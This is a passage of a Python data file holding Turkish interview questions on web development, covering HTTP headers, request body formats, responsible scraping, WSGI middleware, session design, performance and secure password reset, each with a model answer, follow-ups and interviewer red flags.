       '<p><b>' + c('Accept') + '</b> ise istemcinin <i>hangi türleri kabul ettiğini</i> söyler: ' + c('Accept: application/json') + '. Sunucu buna göre temsil seçer (içerik pazarlığı, content negotiation); uygun bir tür yoksa ' + c('406') + ' dönebilir. Benzer şekilde ' + c('Accept-Language: tr-TR') + ' dil, ' + c('Accept-Encoding: br, gzip') + ' sıkıştırma için kullanılır.</p>'
       '<p><b>Yanlış Content-Type\'ın sonuçları:</b></p><ul><li>JSON gövdeyi ' + c('Content-Type') + ' olmadan göndermek: Flask\'ta ' + c('request.get_json()') + ' hata verir veya ' + c('None') + ' döner; FastAPI 422 döner.</li>'
       '<li>Charset belirtmemek: Türkçe karakterler bozuk ("ÅŸ") görünebilir.</li>'
       '<li>Kullanıcı yüklemesini yanlış türle sunmak: Tarayıcı dosyayı tahmin etmeye çalışır (MIME sniffing) ve bir "görsel" HTML gibi çalıştırılabilir. Bunu önlemek için ' + c('X-Content-Type-Options: nosniff') + ' başlığı eklenir.</li></ul>'
       '<p>Python\'da ' + c('requests.post(url, json=veri)') + ' hem gövdeyi serileştirir hem de doğru başlığı otomatik ekler; ' + c('data=json.dumps(veri)') + ' ise başlığı eklemez.</p>',
     follow=['requests\'te json= ile data= arasındaki fark nedir?', 'nosniff başlığı olmazsa kullanıcı yüklemeleri nasıl tehlikeli olabilir?'],
     flags=['Content-Type ile Accept\'i karıştırmak', 'charset\'in önemini bilmemek'],
     tip='İki başlığı "gönderdiğim" ve "istediğim" diye ayırarak anlat; akılda kalıcı bir ayrımdır.'),

dict(roles=['web'], lv='temel', topic='Form, JSON ve multipart', kind='kavram',
     q='Bir HTML formu, JSON gövdesi ve ' + '<code>multipart/form-data</code> ile veri göndermek arasındaki fark nedir? Flask ve FastAPI\'de her birini nasıl okursun?',
     a='<ul><li><b>' + c('application/x-www-form-urlencoded') + ':</b> Klasik HTML formunun varsayılanıdır. Gövde sorgu dizesi gibidir: ' + c('ad=Ay%C5%9Fe&yas=29') + '. Değerler düz metindir ve iç içe yapı yoktur. Flask: ' + c('request.form["ad"]') + '. FastAPI: ' + c('ad: str = Form()') + ' (' + c('python-multipart') + ' paketi gerekir).</li>'
       '<li><b>' + c('application/json') + ':</b> API\'lerin standardı. İç içe nesneler, diziler ve tipler (sayı, boolean, null) taşınır. Tarayıcıda ' + c('fetch') + ' ile gönderilir. Flask: ' + c('request.get_json()') + '. FastAPI: bir Pydantic modelini parametre olarak almak yeterli; doğrulama otomatik yapılır.</li>'
       '<li><b>' + c('multipart/form-data') + ':</b> Dosya yüklemeleri için kullanılır. Gövde, bir sınır (boundary) dizesiyle ayrılmış parçalardan oluşur; her parçanın kendi başlıkları (ad, dosya adı, tür) vardır ve ikili veri kodlanmadan taşınır. HTML formunda ' + c('enctype="multipart/form-data"') + ' gerekir. Flask: ' + c('request.files["cv"]') + '. FastAPI: ' + c('cv: UploadFile') + '; dosya büyükse belleğe değil geçici diske alınır.</li></ul>'
       '<p><b>Seçim:</b> API için JSON; dosya varsa multipart (metin alanları da aynı istekte gönderilebilir); sunucu tarafında üretilen klasik formlar için urlencoded. Çok büyük dosyalarda doğrudan nesne depolamaya imzalı bağlantıyla yükleme daha iyidir.</p>'
       '<p><b>Güvenlik:</b> Gövde boyut sınırı (Flask ' + c('MAX_CONTENT_LENGTH') + ') ayarlanmalı ve dosya adına asla güvenilmemelidir (' + c('werkzeug.utils.secure_filename') + ').</p>',
     follow=['JSON ile dosyayı aynı istekte göndermek gerekirse ne yaparsın?', 'Flask\'ta request.form neden boş gelebilir?'],
     flags=['Dosya yüklemek için JSON içine base64 gömmeyi varsayılan çözüm olarak sunmak', 'Boyut sınırından hiç söz etmemek'],
     tip='Her biçim için tek satırlık "ne zaman" ve "nasıl okunur" bilgisini ver; kısa ama eksiksiz olur.'),

dict(roles=['web', 'otomasyon'], lv='orta', topic='Web kazıma', kind='kavram',
     q='Bir rakip sitenin ürün fiyatlarını Python ile toplamamız istendi. Teknik yaklaşımın ve dikkat edeceğin hukuki ve etik noktalar neler?',
     a='<p><b>Önce kontrol:</b> Sitenin resmî bir API\'si veya veri akışı var mı? Varsa onu kullanırım. Kullanım koşullarını ve ' + c('robots.txt') + ' dosyasını (' + c('urllib.robotparser') + ') okurum. Hukuki çerçeve için şirketin hukuk ekibine danışırım: veritabanı hakları, haksız rekabet ve kişisel veri içeriyorsa KVKK. Kişisel veri toplamam.</p>'
       '<p><b>Teknik yaklaşım:</b></p><ul><li><b>Statik HTML:</b> ' + c('httpx') + '/' + c('requests') + ' ile sayfa alınır, ' + c('BeautifulSoup') + ' veya ' + c('selectolax') + ' ile CSS seçicilerle ayrıştırılır.</li>'
       '<li><b>JavaScript ile oluşturulan sayfalar:</b> Önce tarayıcının ağ sekmesinde sayfanın çağırdığı JSON uç noktasını ararım; çoğu zaman en temiz kaynak odur. Gerekirse Playwright ile gerçek tarayıcı çalıştırırım (daha yavaş ve pahalı).</li>'
       '<li><b>Ölçek:</b> Çok sayıda sayfa için Scrapy; eşzamanlı istekler asyncio ile.</li></ul>'
       '<p><b>Sorumlu davranış:</b> Hız sınırı (ör. saniyede 1 istek) ve istekler arasında rastgele bekleme; yanıt 429 veya 503 olursa geri çekilme; kendimizi tanıtan bir ' + c('User-Agent') + '; mesai dışı saatlerde çalışma; önbellekle aynı sayfayı tekrar indirmeme. Giriş gerektiren alanlara ve CAPTCHA arkasına geçmeye çalışmam.</p>'
       '<p><b>Sağlamlık:</b> Site yapısı sık değişir; seçicilere bağımlılığı azaltan doğrulama ve testler yazar, ayrıştırma hatalarında alarm kurarım. Ham HTML\'i saklayıp yeniden işleyebilmek hata ayıklamayı kolaylaştırır.</p>',
     follow=['Sayfa verisi JavaScript ile yükleniyorsa ilk ne yaparsın?', 'Kazıyıcı bir gün sessizce boş veri döndürmeye başlarsa bunu nasıl fark edersin?'],
     flags=['Hukuki ve etik boyutu hiç anmamak', 'Hız sınırı olmadan yüzlerce eşzamanlı istek önermek'],
     tip='Teknik cevaptan önce "resmî API var mı, koşullar ne diyor" sorularını sormak olgunluk göstergesidir.'),

dict(roles=['web', 'backend'], lv='ileri', topic='WSGI ara katmanı', kind='kod-okuma',
     q='Basit bir WSGI uygulaması ve onu saran bir ara katman (middleware). Çıktı nedir?',
     code='def uygulama(environ, start_response):\n    if environ["PATH_INFO"] == "/saglik":\n        start_response("200 OK", [("Content-Type", "text/plain")])\n        return [b"ok"]\n    start_response("404 Not Found", [("Content-Type", "text/plain")])\n    return [b"yok"]\n\ndef baslik_ekle(app):\n    def sarici(environ, start_response):\n        def yakala(durum, basliklar):\n            print("durum:", durum)\n            basliklar.append(("X-Sunucu", "pedal-1"))\n            return start_response(durum, basliklar)\n        return app(environ, yakala)\n    return sarici\n\napp = baslik_ekle(uygulama)\n\ndef sahte_sunucu(durum, basliklar):\n    print("başlıklar:", basliklar)\n\nfor yol in ["/saglik", "/admin"]:\n    govde = app({"PATH_INFO": yol, "REQUEST_METHOD": "GET"}, sahte_sunucu)\n    print(b"".join(govde).decode())\n',
     out="durum: 200 OK\nbaşlıklar: [('Content-Type', 'text/plain'), ('X-Sunucu', 'pedal-1')]\nok\ndurum: 404 Not Found\nbaşlıklar: [('Content-Type', 'text/plain'), ('X-Sunucu', 'pedal-1')]\nyok",
     a='<p><b>WSGI sözleşmesi:</b> Uygulama, ' + c('environ') + ' (istek bilgilerini içeren sözlük) ve ' + c('start_response') + ' (durum ve başlıkları sunucuya bildiren fonksiyon) alan bir çağrılabilirdir ve bayt parçalarından oluşan bir yinelenebilir döndürür. Flask ve Django\'nun en altında da bu arayüz vardır.</p>'
       '<p><b>Ara katman</b>, aynı arayüze sahip olup başka bir WSGI uygulamasını saran bir uygulamadır; dışarıdan bakıldığında yine bir WSGI uygulamasıdır. Bu yüzden katmanlar üst üste dizilebilir. Burada ' + c('baslik_ekle') + ', iç uygulamaya gerçek ' + c('start_response') + ' yerine kendi ' + c('yakala') + ' fonksiyonunu verir. İç uygulama ' + c('yakala') + '\'yı çağırdığında ara katman durumu loglar, başlık listesine ' + c('X-Sunucu') + ' ekler ve gerçek ' + c('start_response') + '\'a iletir. Sıra her istekte: "durum" satırı, sonra sunucunun gördüğü başlıklar, en son gövde.</p>'
       '<p>Bu kalıp bir dekoratöre benzer: closure ile sarılan bir çağrılabilir. Ara katmanlar kimlik doğrulama, loglama, sıkıştırma, CORS ve hata yakalama için kullanılır. Django\'nun ' + c('MIDDLEWARE') + ' listesi aynı fikrin daha üst düzey bir sürümüdür.</p>'
       '<p><b>Dikkat:</b> Gövde bir üreteç olabilir (akış yanıtı); ara katman onu tamamen belleğe okursa akış özelliği bozulur. ASGI\'de imza ' + c('async (scope, receive, send)') + ' olur ve başlıklar ' + c('send') + ' sarılarak değiştirilir.</p>',
     follow=['Yanıt süresini ölçen bir WSGI ara katmanı nasıl yazarsın?', 'Ara katmanların sırası neden önemlidir?'],
     flags=['WSGI uygulamasının string döndürdüğünü sanmak (bayt parçaları döner)', 'Ara katmanın iç uygulamayı nasıl çağırdığını açıklayamamak'],
     tip='Ara katmanı "aynı imzaya sahip sarıcı" diye tanımla ve dekoratörlerle benzerliğini kur.'),

dict(roles=['web'], lv='orta', topic='HTTP durum sınıfları ve başlıklar', kind='kod-okuma',
     q='Standart kütüphanedeki ' + '<code>http.HTTPStatus</code> ve <code>wsgiref.headers.Headers</code> ile neler yapılabilir? Çıktı nedir?',
     code='from http import HTTPStatus\nfrom wsgiref.headers import Headers\n\nfor kod in (201, 304, 429, 503):\n    s = HTTPStatus(kod)\n    print(kod, s.name, kod // 100, s.phrase)\n\nh = Headers([("Content-Type", "application/json")])\nh["cache-control"] = "no-store"\nprint(h["CONTENT-TYPE"], h.get("Cache-Control"))\nprint(HTTPStatus.TOO_MANY_REQUESTS == 429)\n',
     out='201 CREATED 2 Created\n304 NOT_MODIFIED 3 Not Modified\n429 TOO_MANY_REQUESTS 4 Too Many Requests\n503 SERVICE_UNAVAILABLE 5 Service Unavailable\napplication/json no-store\nTrue',
     a='<p><b>' + c('HTTPStatus') + '</b> bir ' + c('IntEnum') + '\'dur: her durum kodunun adı ve standart açıklaması (' + c('phrase') + ') vardır. ' + c('IntEnum') + ' olduğu için tamsayılarla doğrudan karşılaştırılabilir; son satır True. Kodda ' + c('return 429') + ' gibi "sihirli sayılar" yerine ' + c('HTTPStatus.TOO_MANY_REQUESTS') + ' yazmak okunabilirliği artırır. FastAPI ' + c('status.HTTP_429_TOO_MANY_REQUESTS') + ' ile benzer sabitler sunar.</p>'
       '<p><b>Sınıflar</b> ilk haneyle belirlenir (' + c('kod // 100') + '): 1xx bilgi, 2xx başarı, 3xx yönlendirme veya önbellek (304 gövdesizdir), 4xx istemci hatası (429: istemci yavaşlamalı, ' + c('Retry-After') + '\'a bakmalı), 5xx sunucu hatası (503: geçici; yeniden denenebilir). Yeniden deneme mantığı genellikle bu sınıflara göre kurulur: 5xx ve 429 yeniden denenir, diğer 4xx\'ler denenmez.</p>'
       '<p><b>Başlık adları büyük-küçük harfe duyarsızdır</b> (RFC 9110). ' + c('Headers') + ' nesnesi bunu uygular: ' + c('cache-control') + ' olarak yazılan değer ' + c('Cache-Control') + ' ile okunur. Başlıkları düz bir ' + c('dict') + '\'te tutup ' + c('basliklar["Content-Type"]') + ' ile aramak, istemci küçük harf gönderdiğinde (HTTP/2 hep küçük harf kullanır) hataya yol açar. ' + c('requests') + ' kütüphanesi bunun için ' + c('CaseInsensitiveDict') + ' kullanır.</p>',
     follow=['Hangi durum kodlarında otomatik yeniden deneme yaparsın?', 'HTTP/2\'de başlık adları neden hep küçük harftir?'],
     flags=['Başlıkların büyük-küçük harfe duyarlı olduğunu sanmak', '304\'ü hata kodu sanmak'],
     tip='Durum sınıflarını yeniden deneme kararına bağlamak, bilgiyi pratiğe döktüğünü gösterir.'),

dict(roles=['web', 'backend'], lv='orta', topic='Tasarım: çok sunuculu oturum yönetimi', kind='tasarim',
     q='Pusula İK web uygulaması tek sunucudan 6 sunucuya çıkıyor. Kullanıcılar rastgele çıkış yaptırılıyor. Oturum yönetimini nasıl yeniden tasarlarsın?',
     a='<p><b>Teşhis:</b> Oturumlar büyük olasılıkla süreç belleğinde veya yerel dosyada tutuluyor. Yük dengeleyici kullanıcının sonraki isteğini başka sunucuya gönderince oturum bulunamıyor ve kullanıcı çıkış yapmış görünüyor.</p>'
       '<p><b>Seçenekler:</b></p><ol><li><b>Yapışkan oturum (sticky session):</b> Yük dengeleyici kullanıcıyı hep aynı sunucuya yollar. Hızlı bir yamadır, ama sunucu yeniden başlarsa oturumlar kaybolur ve yük dengesizleşir. Kalıcı çözüm olarak önermem.</li>'
       '<li><b>Merkezi oturum deposu (önerim):</b> Oturum verisi Redis\'te tutulur (Django: ' + c('SESSION_ENGINE = "django.contrib.sessions.backends.cache"') + ' + ' + c('django-redis') + '; Flask: ' + c('Flask-Session') + '). Tarayıcıda yalnızca rastgele oturum kimliği içeren HttpOnly, Secure, SameSite=Lax bir çerez durur. Tüm sunucular aynı depoyu okur; çıkış ve "tüm cihazlardan çıkış" anında uygulanır. Redis\'in yüksek erişilebilirliği (replika, Sentinel) sağlanmalıdır.</li>'
       '<li><b>İmzalı çerez veya JWT:</b> Durum istemcide taşınır, sunucu depoya ihtiyaç duymaz. Ama anında iptal zordur ve çerez büyür; İK gibi hassas verili bir sistemde tercih etmem.</li></ol>'
       '<p><b>Diğer kontroller:</b> Tüm sunucularda aynı ' + c('SECRET_KEY') + ' kullanılmalı; farklı anahtarlar imzaları geçersiz kılar ve aynı belirtiyi üretir. CSRF token\'ları da oturuma bağlı olduğu için ortak depoda tutulmalıdır. Hareketsizlik zaman aşımı (ör. 30 dk) ve yetki yükseltilince (giriş sonrası) oturum kimliği yenilenmelidir (session fixation koruması).</p>',
     follow=['Redis çökerse kullanıcı deneyimi ne olur, nasıl hafifletirsin?', 'Session fixation saldırısı nedir?'],
     flags=['Kalıcı çözüm olarak yalnızca sticky session önermek', 'Sunucular arasında farklı SECRET_KEY olasılığını hiç düşünmemek'],
     tip='Önce kök nedeni açıkla, sonra seçenekleri artı ve eksileriyle sun, en sonda gerekçeli bir tercih yap.'),

dict(roles=['web'], lv='ileri', topic='Tasarım: web performansı', kind='tasarim',
     q='Lezzet Kurye\'nin restoran listeleme sayfası mobilde 6 saniyede açılıyor. Uçtan uca performans iyileştirme planını anlat.',
     a='<p><b>1. Ölç:</b> Tahminle değil veriyle ilerlerim. Lighthouse ve WebPageTest ile laboratuvar ölçümü, gerçek kullanıcı ölçümü (RUM) ile Core Web Vitals: LCP (en büyük içeriğin görünmesi), INP (etkileşim gecikmesi), CLS (görsel kayma). Sunucu tarafında TTFB (ilk bayta kadar geçen süre) ve APM izleriyle sürenin nereye gittiğini ayırırım.</p>'
       '<p><b>2. Sunucu (TTFB yüksekse):</b> N+1 sorguları ve eksik indeksleri giderir (ör. konum ve "şu an açık mı" filtresi için uygun indeks); listeyi imleç tabanlı sayfalarım; sık istenen bölge listelerini kısa TTL ile Redis\'te önbelleklerim; yanıtı Brotli/gzip ile sıkıştırırım.</p>'
       '<p><b>3. Ağ ve teslim:</b> Statik varlıklar CDN\'den, parmak izli adlar ve uzun ' + c('max-age') + ' ile; HTTP/2 veya HTTP/3; kritik kaynaklar için ' + c('preconnect') + ' ve ' + c('preload') + '.</p>'
       '<p><b>4. Görseller (genellikle en büyük kazanç):</b> Restoran fotoğrafları WebP/AVIF biçiminde, ekrana uygun boyutlarda (' + c('srcset') + '), ekran dışındakiler ' + c('loading="lazy"') + ' ile yüklenir. Boyutları önceden belirtilerek CLS önlenir; LCP görseline ' + c('fetchpriority="high"') + ' verilir.</p>'
       '<p><b>5. JavaScript:</b> Paketi küçültürüm: kod bölme, kullanılmayan kütüphanelerin çıkarılması, üçüncü taraf betiklerin ' + c('defer') + ' ile ertelenmesi. İlk görünüm sunucuda oluşturulur (SSR).</p>'
       '<p><b>6. Koru:</b> CI\'da performans bütçesi (ör. JS &lt; 200 KB, LCP &lt; 2,5 sn) tanımlar ve geriye gidişleri engellerim. Her değişikliğin etkisini ayrı ayrı ölçerim.</p>',
     follow=['LCP\'yi en çok hangi faktörler etkiler?', 'Performans iyileştirmenin işe etkisini nasıl kanıtlarsın?'],
     flags=['Ölçmeden çözüm listesi saymak', 'Yalnızca sunucu tarafına veya yalnızca frontend\'e odaklanmak'],
     tip='"Önce ölç" diyerek başla ve iyileştirmeleri sunucu, ağ, görsel, JS katmanlarına ayır; kapsamlı ama düzenli görünür.'),

dict(roles=['web', 'backend'], lv='ileri', topic='Tasarım: güvenli şifre sıfırlama', kind='tasarim',
     q='Anadolu Market için güvenli bir "şifremi unuttum" akışı tasarla. Hangi saldırılara karşı ne önlem alırsın?',
     a='<p><b>Akış:</b></p><ol><li>Kullanıcı e-posta adresini girer. Hesap olsun ya da olmasın <b>aynı mesaj</b> gösterilir ("Kayıtlıysa bağlantı gönderdik") ve yanıt süresi benzer tutulur. Böylece hangi e-postaların kayıtlı olduğu sızdırılmaz (hesap numaralandırma).</li>'
       '<li>Sunucu ' + c('secrets.token_urlsafe(32)') + ' ile tahmin edilemez bir token üretir. Veritabanında tokenın kendisi değil <b>özeti</b> (SHA-256), kullanıcı kimliği ve kısa bir son kullanma süresi (ör. 30 dk) saklanır; veritabanı sızsa bile token kullanılamaz.</li>'
       '<li>E-postadaki bağlantı ' + c('https://anadolumarket.com/sifre-sifirla?token=...') + ' biçimindedir. Alan adı yapılandırmadan alınır, istekteki ' + c('Host') + ' başlığından değil (host header injection).</li>'
       '<li>Kullanıcı yeni şifreyi belirler; token <b>tek kullanımlıktır</b> ve hemen geçersiz kılınır. Diğer tüm açık tokenlar da iptal edilir.</li>'
       '<li>Şifre değişince tüm mevcut oturumlar ve yenileme tokenları sonlandırılır; kullanıcıya "şifreniz değiştirildi" bildirimi gönderilir.</li></ol>'
       '<p><b>Ek önlemler:</b> E-posta ve IP başına hız sınırı (SMS/e-posta bombardımanını ve kaba kuvveti önler). Sıfırlama sayfasında ' + c('Referrer-Policy: no-referrer') + ' kullanılır ki token üçüncü taraf betiklere sızmasın. Token loglara yazılmaz. Yeni şifre için minimum uzunluk ve sızmış parola listesi kontrolü yapılır. İki faktörlü doğrulama açıksa sıfırlama sonrası ikinci faktör yine istenir. Tüm sıfırlama olayları güvenlik denetimi için loglanır.</p>',
     follow=['Token\'ı neden özet olarak saklıyorsun?', 'Kullanıcı e-posta hesabını da kaybettiyse kimliğini nasıl doğrularsın?'],
     flags=['"Bu e-posta kayıtlı değil" mesajıyla hesap varlığını sızdırmak', 'Token\'ı süresiz ve çok kullanımlık tasarlamak', 'random modülüyle token üretmek'],
     tip='Her adımın yanında hangi saldırıyı engellediğini söyle; güvenlik tasarımında gerekçe her şeydir.'),
]
